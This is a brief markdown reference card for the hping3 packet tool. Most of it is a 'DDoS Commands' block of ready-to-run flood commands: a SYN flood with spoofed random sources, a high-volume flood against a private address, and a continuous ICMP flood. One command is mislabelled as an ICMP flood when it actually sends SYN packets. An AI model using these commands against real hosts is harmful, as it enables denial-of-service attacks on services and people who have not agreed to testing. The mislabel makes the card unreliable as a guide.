# hping3

## Description
Powerful command-line TCP/IP packet assembler/analyzer. Used for DDoS testing via ICMP floods, SYN floods, and custom packet crafting. Pre-installed on Kali Linux.

## Source
- https://www.kali.org/tools/hping3/

## DDoS Commands
```bash
# SYN flood on port 80
hping3 -S -p 80 --flood --rand-source <IP>

# ICMP flood (1000 packets)
hping3 -V -c 1000 -d 1000 -S -p 80 --flood 192.168.0.1

# ICMP flood (continuous)
sudo hping3 -1 --flood <IP>
```
